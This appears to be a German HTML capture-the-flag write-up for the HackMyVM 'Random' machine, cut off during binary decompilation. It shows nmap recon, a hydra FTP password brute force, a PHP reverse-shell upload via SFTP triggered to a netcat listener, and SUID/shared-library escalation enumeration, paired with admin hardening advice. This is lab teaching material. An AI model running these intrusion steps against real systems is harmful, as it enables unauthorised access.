@@ -1,0 +1,620 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Random - HackMyVM - Hard - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css"> <!-- Pfad beibehalten -->
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Random - HackMyVM - Hard - Bericht</h1> <!-- Titel angepasst -->
+        <div class="level-container">
+            <h2>Hard</h2> <!-- Schwierigkeitsgrad ohne Inline-Style, CSS handhabt Farbe (Rot) -->
+            <div class="circle"> <!-- Kreis-CSS wird 'Hard' (Rot) handhaben -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe wird durch CSS gesetzt -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                 <div class="tool-item">arp-scan</div>
+                 <div class="tool-item">nmap</div>
+                 <div class="tool-item">gobuster</div>
+                 <div class="tool-item">hydra</div>
+                 <div class="tool-item">ftp</div>
+                 <div class="tool-item">sftp</div>
+                 <div class="tool-item">curl</div>
+                 <div class="tool-item">nc (netcat)</div>
+                 <div class="tool-item">python3</div>
+                 <div class="tool-item">stty</div>
+                 <div class="tool-item">ls</div>
+                 <div class="tool-item">find</div>
+                 <div class="tool-item">ldd</div>
+                 <div class="tool-item">IDA Pro/Ghidra (implizit)</div>
+                 <div class="tool-item">nano (implizit)</div>
+                 <div class="tool-item">gcc</div>
+                 <div class="tool-item">wget</div>
+                 <div class="tool-item">./random (custom binary)</div>
+                 <div class="tool-item">cat</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access (FTP & Webshell)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (www-data -> root)</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept (Shared Library Injection)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre><span class="command">192.168.2.109	08:00:27:a2:d0:f2	PCS Systemtechnik GmbH</span></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:** Der Befehl `arp-scan -l` wird genutzt, um das lokale Netzwerksegment via ARP nach aktiven Geräten zu scannen.</p>
+             <p class="evaluation">**Bewertung:** Ein Gerät mit der IP `192.168.2.109` wird identifiziert. Die OUI der MAC-Adresse (`08:00:27:...`) gehört zu PCS Systemtechnik GmbH, was auf eine VirtualBox-VM als Ziel hindeutet.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie die IP `192.168.2.109` für weitere Scans (Nmap), um offene Ports und Dienste zu ermitteln.<br>**Empfehlung (Admin):** Standard-Netzwerkaufklärung. Die Absicherung der gefundenen Dienste ist priorisiert.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.109 -p-</span></div>
+                     <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-18 22:XX:XX CEST <span class="comment">(Timestamp unvollständig, Datum aus Hydra übernommen)</span>
+Nmap scan report for random.vm (192.168.2.109)
+Host is up (0.14ms latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">21/tcp open  ftp     vsftpd 3.0.3</span>
+<span class="password">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span>
+|_drwxr-xr--    2 1001     33           4096 Oct 19  2020 html
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:192.168.2.153
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+<span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+| ssh-hostkey:
+|   2048 090e111f720e6c1018551a73a54be564 (RSA)
+|   256 c09f6634561d164a32ad250c8ba01b5a (ECDSA)
+|_  256 4c9557f438a3ceaef0e2a6d9714207c5 (ED25519)
+<span class="command">80/tcp open  http    nginx 1.14.2</span>
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: nginx/1.14.2
+MAC Address: 08:00:27:A2:D0:F2 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.14 ms random.vm (192.168.2.109)
+
+Nmap done: 1 IP address (1 host up) scanned in X.XX seconds</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Ein umfassender Nmap-Scan wird auf `192.168.2.109` durchgeführt, um offene Ports, Dienste, Versionen und das Betriebssystem zu identifizieren. Die Flags bedeuten: `-sS` (SYN Scan), `-sC` (Standard-Skripte), `-T5` (Schnelles Timing), `-sV` (Versionserkennung), `-A` (Aggressiver Scan: OS-Erkennung, Version, Skripte, Traceroute), `-p-` (Alle Ports).</p>
+             <p class="evaluation">**Bewertung:** Der Scan enthüllt drei offene TCP-Ports:
+*   **Port 21 (FTP):** vsftpd 3.0.3. Das Nmap-Skript `ftp-anon` meldet, dass **anonymer FTP-Login erlaubt** ist. Dies ist eine kritische Information. Das Listing (`ls`) im anonymen Kontext zeigt ein Verzeichnis `html`.
+*   **Port 22 (SSH):** OpenSSH 7.9p1 auf Debian 10. Standard-Port für Fernzugriff.
+*   **Port 80 (HTTP):** Nginx 1.14.2. Der Webserver liefert keine spezifische Titelzeile (`http-title`), was auf eine Standard- oder minimale Konfiguration hindeutet.</p>
+             <p class="recommendation">**Empfehlung (Pentester):**
+    1.  **FTP (Priorität 1):** Verbinden Sie sich sofort anonym per FTP (`ftp 192.168.2.109`, Benutzer `anonymous` oder `ftp`, beliebiges Passwort). Untersuchen Sie das `html`-Verzeichnis auf Inhalte, die über den Webserver erreichbar sein könnten, und prüfen Sie auf Schreibrechte.
+    2.  **HTTP (Priorität 2):** Rufen Sie die Webseite im Browser auf und führen Sie Verzeichnis-Enumeration durch (z.B. Gobuster).
+    3.  **SSH (Priorität 3):** Halten Sie Ausschau nach potenziellen Benutzernamen für spätere Brute-Force-Versuche.<br>
+**Empfehlung (Admin):** Deaktivieren Sie anonymen FTP-Zugriff, wenn er nicht absolut notwendig ist. Wenn er benötigt wird, stellen Sie sicher, dass die Berechtigungen extrem restriktiv sind (nur Lesezugriff auf spezifische, unkritische Dateien). Halten Sie alle Dienste aktuell und sicher konfiguriert.</p>
+        </section>
+
+        <section id="web-enumeration">
+             <h2>Web Enumeration</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <pre><span class="command">http://192.168.2.109/index.html</span>
+
+#WARNING
+<span class="password">eleanor, i disabled your ssh access.</span>
+Take care.
+<span class="password">-alan</span></pre>
+                     <pre><span class="comment">=</span></pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Der Inhalt der `index.html`-Datei, die über den Nginx-Webserver auf Port 80 ausgeliefert wird, wurde abgerufen (vermutlich via Browser oder `curl`). Sie enthält eine Warnung.</p>
+             <p class="evaluation">**Bewertung:** Ein wichtiges Informationsleck! Die Nachricht enthüllt zwei potenzielle Benutzernamen: `eleanor` und `alan`. Außerdem gibt sie den Hinweis, dass `eleanor`s SSH-Zugang deaktiviert wurde. Dies legt nahe, dass `eleanor` ein gültiger Benutzer ist, aber möglicherweise andere Login-Methoden (wie FTP) noch funktionieren könnten.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Notieren Sie die Benutzernamen `eleanor` und `alan`. Konzentrieren Sie sich zunächst auf `eleanor`, da der Hinweis auf deaktivierten SSH-Zugang vorliegt – versuchen Sie FTP-Login für `eleanor`. Verwenden Sie beide Namen später für Brute-Force-Angriffe auf andere Dienste, falls nötig.<br>**Empfehlung (Admin):** Entfernen Sie sensible Informationen oder interne Kommunikation von öffentlich zugänglichen Webseiten. Schulen Sie Benutzer darin, keine potenziellen Benutzernamen oder Statusinformationen preiszugeben.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.109 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,.bck,mp4,mkv -t 100</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+[...] <span class="comment">(Parameter wie oben)</span>
+===============================================================
+[... Zeitstempel ...] Starting gobuster
+===============================================================
+<span class="command">/index.html</span>           (Status: 200) [Size: 185]
+[...] <span class="comment">(Keine weiteren relevanten Funde im Log gezeigt)</span>
+===============================================================
+[... Zeitstempel ...] Finished
+===============================================================</pre>
+                    <pre><span class="comment">=</span></pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Gobuster wird eingesetzt, um nach versteckten Verzeichnissen oder Dateien auf dem Webserver (Port 80) zu suchen. Eine Standard-Wortliste und eine breite Palette von Dateierweiterungen werden verwendet.</p>
+             <p class="evaluation">**Bewertung:** Abgesehen von der bereits bekannten `index.html` scheint der Gobuster-Scan keine weiteren relevanten Dateien oder Verzeichnisse aufgedeckt zu haben (basierend auf der unvollständigen Ausgabe im Log). Der Webserver auf Port 80 scheint wenig Angriffsfläche zu bieten.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Da die Web-Enumeration auf Port 80 bisher erfolglos war, konzentrieren Sie sich auf den vielversprechenderen FTP-Dienst (Port 21), insbesondere auf den Benutzer `eleanor`.<br>**Empfehlung (Admin):** Stellen Sie sicher, dass keine unnötigen Dateien oder Verzeichnisse über den Webserver erreichbar sind. Konfigurieren Sie Nginx sicher.</p>
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (FTP & Webshell)</h2>
+             <p class="analysis">**Analyse:** Basierend auf den Funden (Benutzername `eleanor`, offener FTP-Dienst) wird versucht, Zugang über FTP zu erlangen und anschließend eine Webshell hochzuladen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l eleanor -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.109:21 -t64 -I</span></div>
+                    <pre>
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-18 22:40:02
+[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344421 login tries (l:1/p:14344421), ~224132 tries per task
+[DATA] attacking ftp://192.168.2.109:21/
+
+:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+[21][ftp] host: 192.168.2.109   login: <span class="command">eleanor</span>   password: <span class="password">ladybug</span> <span class="password">[SUCCESS]</span>
+:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+1 of 1 target successfully completed, 1 valid password found</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Das Tool Hydra wird verwendet, um einen Brute-Force-Angriff auf den FTP-Dienst (Port 21) für den Benutzer `eleanor` durchzuführen.
+*   `-l eleanor`: Zielbenutzer.
+*   `-P /usr/share/wordlists/rockyou.txt`: Passwortliste.
+*   `ftp://192.168.2.109:21`: Ziel-URL und Dienst.
+*   `-t64`: Anzahl der parallelen Threads.
+*   `-I`: Ignoriert vorhandene Restore-Datei.</p>
+             <p class="evaluation">**Bewertung:** Der Brute-Force-Angriff ist erfolgreich! Hydra findet das Passwort `ladybug` für den Benutzer `eleanor`. Dies ist ein schwaches, leicht zu erratendes Passwort.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie die Zugangsdaten `eleanor:ladybug`, um sich per FTP oder SFTP am Zielsystem anzumelden und nach Möglichkeiten zum Hochladen einer Webshell oder zur weiteren Enumeration zu suchen.<br>**Empfehlung (Admin):** Ändern Sie sofort das Passwort für `eleanor`. Erzwingen Sie starke Passwortrichtlinien. Deaktivieren Sie FTP, wenn es nicht benötigt wird, oder konfigurieren Sie es sicher (z.B. FTPS, Benutzer-Isolation, Fail2Ban gegen Brute-Force).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ftp 192.168.2.109</span></div>
+                    <pre>
+Connected to 192.168.2.109.
+220 (vsFTPd 3.0.3)
+Name (192.168.2.109:root): <span class="command">eleanor</span>
+331 Please specify the password.
+Password: <span class="password">********</span> <span class="comment">(ladybug eingegeben)</span>
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> <span class="command">put rev.php</span>
+local: rev.php remote: rev.php
+229 Entering Extended Passive Mode (|||5034|)
+<span class="password">550 Permission denied.</span>
+ftp> <span class="command">los</span> <span class="comment"><-- Tippfehler --></span>
+?Invalid command.
+ftp> <span class="command">ls</span>
+229 Entering Extended Passive Mode (|||46326|)
+150 Here comes the directory listing.
+-rw-r--r--    1 33       33            185 Oct 19  2020 index.html
+226 Directory send OK.
+ftp> <span class="command">ls -la</span>
+229 Entering Extended Passive Mode (|||19521|)
+150 Here comes the directory listing.
+drwxr-xr--    2 <span class="command">1001</span>     <span class="command">33</span>           4096 Oct 19  2020 . <span class="comment"><-- UID 1001 (eleanor?), GID 33 (www-data?) --></span>
+drwxr-xr-x    3 0        113          4096 Oct 19  2020 ..
+-rw-r--r--    1 <span class="command">33</span>       <span class="command">33</span>            185 Oct 19  2020 index.html <span class="comment"><-- Gehört www-data? --></span>
+226 Directory send OK.
+ftp> <span class="command">cd ..</span>
+250 Directory successfully changed.
+ftp> <span class="command">ls -la</span>
+229 Entering Extended Passive Mode (|||26104|)
+150 Here comes the directory listing.
+drwxr-xr-x    3 0        113          4096 Oct 19  2020 .
+drwxr-xr-x    3 0        113          4096 Oct 19  2020 ..
+<span class="command">drwxr-xr--    2 1001     33           4096 Oct 19  2020 html</span> <span class="comment"><-- Das Web-Root-Verzeichnis --></span>
+226 Directory send OK.
+ftp> <span class="command">cd html</span>
+250 Directory successfully changed.
+ftp> <span class="command">pwd</span>
+Remote directory: /html
+ftp> <span class="command">exit</span>
+221 Goodbye.</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Es wird eine Verbindung zum FTP-Server als Benutzer `eleanor` mit dem Passwort `ladybug` hergestellt. Es wird versucht, eine Datei `rev.php` (vermutlich eine Reverse-Shell) hochzuladen, was jedoch mit "Permission denied" fehlschlägt. Anschließend wird die Verzeichnisstruktur erkundet. Das Home-Verzeichnis von `eleanor` scheint `/html` zu sein (das Web-Root-Verzeichnis von Nginx). Die `index.html` darin gehört jedoch dem Benutzer/Gruppe mit ID 33 (typischerweise `www-data`). Eleanor (UID 1001) hat keine Schreibrechte in diesem Verzeichnis über den Standard-FTP-Client.</p>
+             <p class="evaluation">**Bewertung:** Der FTP-Login funktioniert, aber die Berechtigungen verhindern das direkte Hochladen einer Webshell in das Web-Root-Verzeichnis `/html` mittels des `ftp`-Clients. Dies ist ein kleiner Rückschlag, aber der Zugriff als `eleanor` ist etabliert.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Versuchen Sie, sich per SFTP (SSH File Transfer Protocol) als `eleanor` zu verbinden. SFTP respektiert möglicherweise die Unix-Dateiberechtigungen anders oder erlaubt den Zugriff auf Verzeichnisse, die über FTP nicht korrekt gehandhabt werden. Prüfen Sie, ob das `/html`-Verzeichnis selbst für `eleanor` (UID 1001) schreibbar ist, auch wenn die `index.html` darin `www-data` gehört.<br>**Empfehlung (Admin):** Korrigieren Sie die Dateiberechtigungen. Das Home-Verzeichnis eines Benutzers sollte nicht das Web-Root sein. Der Web-Root sollte idealerweise nur für den Webserver-Benutzer (`www-data`) schreibbar sein (und auch das nur in spezifischen Upload-Verzeichnissen). Stellen Sie sicher, dass FTP-Benutzer in ihren Home-Verzeichnissen "gejailt" sind und keine Schreibrechte auf kritische Systembereiche haben.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="comment"># Neuer Versuch revshell per ftp</span> </pre> <span class="comment"><-- Eher SFTP --></span>
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">sftp eleanor@192.168.2.109</span></div>
+                     <pre>
+The authenticity of host '192.168.2.109 (192.168.2.109)' can't be established.
+ED25519 key fingerprint is SHA256:v2xcWcAAUcAUpB1Nz4duz+QZL1zveUkV/SmLUqBhuUc.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? <span class="command">yes</span>
+Warning: Permanently added '192.168.2.109' (ED25519) to the list of known hosts.
+eleanor@192.168.2.109's password: <span class="password">********</span> <span class="comment">(ladybug eingegeben)</span>
+Connected to 192.168.2.109.
+sftp> <span class="command">ls</span>
+<span class="command">html</span>
+sftp> <span class="command">cd html/</span>
+sftp> <span class="command">ls</span>
+<span class="command">index.html</span>
+sftp> <span class="command">put rev.php</span>
+Uploading rev.php to /html/rev.php
+rev.php                                                                             100% 5495    12.7MB/s   00:00    <span class="password"><-- Upload erfolgreich! --></span>
+sftp> <span class="command">ls</span>
+<span class="command">index.html   rev.php</span>
+sftp> <span class="command">exit</span></pre> <span class="comment"><-- exit fehlt im Log --></span>
+                     <pre><span class="comment">* Hat geklappt *</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Es wird eine SFTP-Verbindung als `eleanor` aufgebaut. Nach dem Login wird in das `html`-Verzeichnis gewechselt. Der Befehl `put rev.php` wird ausgeführt, um die lokale `rev.php`-Datei auf den Server in das `/html`-Verzeichnis hochzuladen.</p>
+              <p class="evaluation">**Bewertung:** Erfolg! Im Gegensatz zum `ftp`-Versuch war der Upload mittels SFTP erfolgreich. Dies bedeutet, dass der Benutzer `eleanor` Schreibrechte im Verzeichnis `/html` hat, obwohl der `ftp`-Daemon dies möglicherweise anders interpretierte oder verhinderte. Die `rev.php`-Webshell befindet sich nun im Web-Root-Verzeichnis und kann über HTTP aufgerufen werden.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Starten Sie einen Netcat-Listener auf Ihrer Maschine, der auf die Verbindung von `rev.php` wartet. Rufen Sie dann `http://192.168.2.109/rev.php` mit `curl` oder einem Browser auf, um die Shell auszulösen.<br>**Empfehlung (Admin):** Korrigieren Sie die Dateiberechtigungen für das `/html`-Verzeichnis! Der Benutzer `eleanor` sollte keine Schreibrechte im Web-Root haben. Untersuchen Sie die Konfiguration des SSH/SFTP-Servers und des FTP-Servers, um die unterschiedlichen Berechtigungen zu verstehen und zu vereinheitlichen (idealerweise Least Privilege).</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                      <pre>listening on [any] 9001 ...</pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Ein Netcat-Listener wird auf dem Angreifer-System auf Port 9001 gestartet, um die eingehende Verbindung der Reverse Shell (`rev.php`) zu empfangen.</p>
+              <p class="evaluation">**Bewertung:** Der Listener ist bereit.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Lösen Sie nun die Webshell aus.<br>**Empfehlung (Admin):** Firewalls können ausgehende Verbindungen vom Webserver blockieren.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">curl "http://192.168.2.109/rev.php"</span></div>
+                      <pre><span class="comment">[... Keine Ausgabe von curl, löst aber die Shell aus ...]</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Der Befehl `curl` wird verwendet, um die hochgeladene Datei `rev.php` über HTTP aufzurufen. Dies veranlasst den Nginx-Webserver, das PHP-Skript auszuführen.</p>
+             <p class="evaluation">**Bewertung:** Dieser Schritt löst den in `rev.php` enthaltenen Reverse-Shell-Payload aus. Das Skript wird sich nun mit dem Netcat-Listener auf Port 9001 verbinden.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Wechseln Sie zum Netcat-Listener-Fenster, um die eingehende Shell zu überprüfen.<br>**Empfehlung (Admin):** Entfernen Sie die hochgeladene `rev.php`. Überwachen Sie Webserver-Logs auf verdächtige Anfragen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div> <span class="comment"><-- Fortsetzung des Listeners --></span>
+                      <pre>
+listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.153] from (UNKNOWN) [192.168.2.109] 33088</span> <span class="password"><-- Verbindung erhalten! --></span>
+Linux random 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64 GNU/Linux
+ 16:49:04 up 19 min,  0 users,  load average: 0.00, 0.02, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span> <span class="password"><-- Shell als www-data --></span>
+/bin/sh: 0: can't access tty; job control turned off
+$ </pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der Netcat-Listener empfängt die Verbindung vom Zielsystem. Systeminformationen werden angezeigt, und der `id`-Befehl (implizit durch `uid=...`) zeigt, dass die Shell als Benutzer `www-data` (UID 33) läuft. Es handelt sich um eine einfache `/bin/sh`-Shell ohne volle Terminal-Funktionen.</p>
+              <p class="evaluation">**Bewertung:** Initialer Zugriff erfolgreich! Eine Shell als `www-data` wurde über die hochgeladene PHP-Datei erlangt.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Stabilisieren Sie die Shell für bessere Bedienbarkeit (z.B. mit Python PTY).<br>**Empfehlung (Admin):** Beginnen Sie mit der Bereinigung des Systems und der Analyse der Kompromittierung.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="comment">$ python3 -c 'import pty;pty.spawn("/bin/bash")'</span>
+<span class="prompt">www-data@random:/$</span> <span class="command">export TERM=xterm</span>
+export TERM=xterm
+<span class="prompt">www-data@random:/$</span> <span class="command">^Z</span>
+zsh: suspended  nc -lvnp 9001
+
+<span class="prompt">┌──(root㉿cyber)-[~]</span>
+<span class="prompt">└─#</span> <span class="command">stty raw -echo;fg</span>
+[1]  + continued  nc -lvnp 9001
+                               reset
+
+<span class="prompt">www-data@random:/$</span> <span class="comment"># Stabile Shell</span></pre>
+                      <pre><span class="comment">=</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Die Standardprozedur zur Stabilisierung der Reverse Shell wird angewendet: Python wird verwendet, um eine PTY-Bash-Shell zu starten, die `TERM`-Variable wird gesetzt, und auf der Angreiferseite werden `stty raw -echo` und `fg` verwendet, um die volle Interaktivität herzustellen.</p>
+              <p class="evaluation">**Bewertung:** Die Shell ist nun stabil und voll funktionsfähig.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Beginnen Sie mit der Enumeration als `www-data`, um nach Wegen zur Privilegieneskalation zu suchen.<br>**Empfehlung (Admin):** Keine spezifische Aktion hier.</p>
+         </section>
+
+        <section id="privilege-escalation">
+             <h2>Privilege Escalation (www-data -> root)</h2>
+             <p class="analysis">**Analyse:** Nach der Stabilisierung der Shell als `www-data` werden Enumerationsschritte durchgeführt, um einen Weg zur Eskalation auf Root-Rechte zu finden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">www-data@random:/$ <span class="command">ls /home</span></div>
+                     <pre><span class="command">alan</span>  <span class="command">eleanor</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Listet die Benutzerverzeichnisse in `/home` auf.</p>
+              <p class="evaluation">**Bewertung:** Bestätigt die Existenz der Benutzer `alan` und `eleanor`, die bereits aus der `index.html` bekannt waren.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Untersuchen Sie die Berechtigungen dieser Verzeichnisse und suchen Sie nach interessanten Dateien darin (soweit lesbar).<br>**Empfehlung (Admin):** Keine.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">www-data@random:/$ <span class="command">find / -perm -u=s -type f 2>/dev/null</span></div>
+                     <pre>
+<span class="command">/home/alan/random</span> <span class="password"><-- Benutzerdefiniertes SUID-Programm!</span>
+/usr/bin/gpasswd
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/mount
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/umount
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper</pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der Befehl `find` sucht im gesamten Dateisystem nach Dateien (`-type f`) mit gesetztem SUID-Bit (`-perm -u=s`). Fehlermeldungen (Permission denied) werden nach `/dev/null` umgeleitet.</p>
+              <p class="evaluation">**Bewertung:** Neben den Standard-SUID-Programmen wird eine benutzerdefinierte Datei gefunden: `/home/alan/random`. SUID-Programme in Benutzerverzeichnissen sind äußerst verdächtig und oft ein direkter Weg zur Privilegieneskalation.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Analysieren Sie `/home/alan/random` sofort:
+    *   Berechtigungen prüfen: `ls -la /home/alan/random` (Wer ist der Besitzer? Ist es SUID Root?).
+    *   Abhängigkeiten prüfen: `ldd /home/alan/random`.
+    *   Funktionsweise verstehen: `strings /home/alan/random` oder Reverse Engineering mit Ghidra/IDA.<br>
+**Empfehlung (Admin):** Untersuchen Sie das Programm `/home/alan/random`. Entfernen Sie das SUID-Bit (`chmod u-s /home/alan/random`) und das Programm selbst, wenn es unsicher oder unnötig ist. SUID-Programme sollten niemals in Benutzerverzeichnissen liegen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">www-data@random:/$ <span class="command">ldd /home/alan/random</span></div>
+                     <pre>
+	linux-vdso.so.1 (0x00007ffe0657a000)
+	<span class="command">librooter.so => /lib/librooter.so (0x00007f8cfec1f000)</span> <span class="password"><-- Benutzerdefinierte Bibliothek!</span>
+	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f8cfea5e000)
+	/lib64/ld-linux-x86-64.so.2 (0x00007f8cfec30000)</pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der Befehl `ldd` listet die dynamischen Bibliotheken auf, die vom Programm `/home/alan/random` benötigt werden.</p>
+              <p class="evaluation">**Bewertung:** Das Programm hängt von einer nicht standardmäßigen Bibliothek namens `librooter.so` ab, die sich im Verzeichnis `/lib` befindet. Dies eröffnet zwei mögliche Angriffsvektoren:
+    1.  **Shared Library Injection / Hijacking:** Wenn das Verzeichnis `/lib` für den aktuellen Benutzer (`www-data`) schreibbar ist, kann die originale `librooter.so` durch eine bösartige Version ersetzt werden. Wenn `/home/alan/random` dann ausgeführt wird (was als `www-data` möglich sein sollte, da es für "others" ausführbar ist), wird die bösartige Bibliothek geladen und deren Code mit den Rechten des SUID-Programms (vermutlich Root, muss noch bestätigt werden) ausgeführt.
+    2.  **LD_PRELOAD:** Wenn `/lib` nicht schreibbar ist, aber eine eigene Version von `librooter.so` erstellt und an einem anderen Ort platziert werden kann, könnte versucht werden, die `LD_PRELOAD`-Umgebungsvariable zu setzen, um das System anzuweisen, die bösartige Bibliothek vor der originalen zu laden. Dies funktioniert jedoch normalerweise nicht bei SUID-Programmen, es sei denn, es gibt spezifische Fehlkonfigurationen.</p>
+              <p class="recommendation">**Empfehlung (Pentester):**
+    1.  Überprüfen Sie die Berechtigungen von `/home/alan/random` mit `ls -la`, um den Besitzer (hoffentlich Root) zu bestätigen.
+    2.  Überprüfen Sie die Berechtigungen des Verzeichnisses `/lib` (`ls -ld /lib`). Wenn es für `www-data` schreibbar ist (was eine massive Fehlkonfiguration wäre!), verfolgen Sie den Shared Library Injection Ansatz.
+    3.  Analysieren Sie die Funktion `makemeroot` (die vermutlich in `librooter.so` definiert ist und von `random` aufgerufen wird), um den Exploit zu planen.<br>
+**Empfehlung (Admin):** Stellen Sie sicher, dass Systemverzeichnisse wie `/lib` niemals für unprivilegierte Benutzer schreibbar sind! Untersuchen Sie die Herkunft und Funktion von `librooter.so`. Entfernen Sie unsichere SUID-Programme.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="comment">Disassemble random with ida.</span>
+
+int __cdecl main(int argc, const char argv, const char envp)
+{
+  time_t v3; // rdi
+  int v5; // [rsp+1Ch] [rbp-4h]
